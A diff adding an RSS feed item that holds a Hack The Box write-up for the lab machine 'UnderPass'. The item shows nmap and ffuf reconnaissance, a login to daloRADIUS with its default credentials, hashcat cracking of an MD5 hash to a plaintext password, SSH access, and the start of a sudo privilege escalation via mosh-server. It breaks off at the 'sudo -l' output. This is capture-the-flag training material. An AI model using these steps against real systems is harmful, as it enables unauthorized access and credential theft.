@@ -1,0 +1,186 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sudo Privilege Escalation on 01MI</title><link>https://01MI.github.io/tags/sudo-privilege-escalation/</link><description>Recent content in Sudo Privilege Escalation on 01MI</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 10 May 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/tags/sudo-privilege-escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>UnderPass - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/underpass-htb-writeup-linux-easy/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/underpass-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/UnderPass.PNG" alt="Featured image of post UnderPass - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
+&lt;/h2>&lt;p>User: Default credentials and weak password reuse&lt;br>
+Root: Sudo Privilege escalation&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>Starting with a simple nmap scan, we can identify that ssh and a web service are exposed.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 4
+&lt;/span>&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
+&lt;/span>&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.10.11.48&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.9&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.10&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ae&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">fb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">f5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">ea&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">61&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">45&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">86&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">bb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">a2&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">OPTIONS&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">POST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache2&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Default&lt;/span> &lt;span class="nx">Page&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">It&lt;/span> &lt;span class="nx">works&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7294&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">12945&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">37517&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">39220&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">44459&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">55246&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">55628&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">64827&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="user">User
+&lt;/h2>&lt;h3 id="fuzzing">Fuzzing
+&lt;/h3>&lt;p>While fuzzing on port 80 with &lt;code>ffuf&lt;/code>, we discover the path &lt;code>/daloradius/app/operators&lt;/code>.&lt;br>
+Navigating to this endpoint redirects us to a &lt;code>Daloradius&lt;/code> login interface, an &lt;a class="link" href="https://github.com/lirantal/daloradius" target="_blank" rel="noopener"
+>&amp;ldquo;advanced RADIUS web platform aimed at managing hotspots and general-purpose SP deployments&amp;rdquo;.&lt;/a>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
+&lt;/span>&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
+&lt;/span>&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/FUZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">daloradius&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">315&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/daloradius/FUZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">319&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">directory&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">list&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">2.3&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">medium&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.48/daloradius/app/FUZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">operators&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">329&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">87&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+Path: http://10.10.11.48/daloradius/app/operators/login.php
+&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path.PNG"
+width="400"
+height="283"
+srcset="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path_hu_77d2d90fa507475d.PNG 480w, https://01MI.github.io/p/underpass-htb-writeup-linux-easy/Path_hu_8d5d68ccca32ce02.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="339px"
+>&lt;/p>
+&lt;h3 id="default-credentials">Default credentials
+&lt;/h3>&lt;p>Using the default credentials &lt;code>administrator:radius&lt;/code>, which are easily found on the internet, we gain access to the home page.&lt;br>
+Then, we can navigate to the &lt;code>users&lt;/code> and notice the password for &lt;code>svcMosh&lt;/code> appears to be an MD5 hash. We can use hashcat to recover the password.
+&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all.PNG"
+width="1306"
+height="475"
+srcset="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all_hu_fe8e5ed1dab6fa68.PNG 480w, https://01MI.github.io/p/underpass-htb-writeup-linux-easy/mng-list-all_hu_31fab4d57f29fe4b.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="274"
+data-flex-basis="659px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">412&lt;/span>&lt;span class="nx">dd4759978acfcc81deab01b382403&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">underwaterfriends&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+Using those credentials, we gain access to the server as svcMosh using SSH.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
+&lt;/span>&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">svcMosh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="sudo-privilege-escalation">Sudo Privilege escalation
+&lt;/h3>&lt;p>&lt;code>svcMosh&lt;/code> is allowed to execute mosh-server, &lt;a class="link" href="https://mosh.org/" target="_blank" rel="noopener"
+>a component of the Mosh remote shell used for interactive SSH-like sessions.&lt;/a>&lt;br>
+Since it can be run with sudo, we can leverage it to obtain a root shell.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 7
+&lt;/span>&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
+&lt;/span>&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
+&lt;/span>&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
+&lt;/span>&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
+&lt;/span>&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">svcMosh&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> 